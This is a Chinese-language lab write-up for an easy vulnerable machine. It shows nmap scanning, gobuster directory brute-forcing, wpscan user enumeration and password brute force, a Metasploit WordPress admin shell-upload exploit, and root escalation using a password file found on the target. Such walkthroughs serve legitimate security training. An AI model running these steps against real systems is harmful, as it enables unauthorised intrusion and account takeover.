> rw signie init=/bin/bash /etc/init.d/networking restart

## 靶机信息
- 级别:容易

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.154

sudo nmap --min-rate 10000 -sT -p- 192.168.1.154 -oA tcp_ports/ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

cat tcp_ports/ports.nmap | grep open | awk -F '/' '{print $1}' | tr '\n\r' ','
//22,53,80,110,139,143,445
```

## Web
![[Pasted image 20231013175441.png]]
### 目录爆破
```shell
gobuster dir -u http://192.168.1.154 -w /usr/share/wordlists/dirb/common.txt -x txt,php
```
![[Pasted image 20231013175750.png]]

## WordPress
#### wpscan
```shell
wpscan --url http://192.168.1.154/wordpress -e ap -e at -e u
```
![[Pasted image 20231013175943.png]]
![[Pasted image 20231013181612.png]]
#### 暴力破解
```shell
wpscan --url http://192.168.1.154/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt

 | Username: c0rrupt3d_brain, Password: 24992499

```


## msf及提权
```msfconsole
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME
set PASSWORD
set TARGETURI
set RHOSTS
exploit

```
![[Pasted image 20231013183643.png]]
```shell
cat .root_password_ssh.txt
willy26

shell //获取目标命令行shell exit退出

python3 -c "import pty;pty.spawn('/bin/bash')"
su root //passwd:willy26
成功提权
```


![[Pasted image 20231013184007.png]]



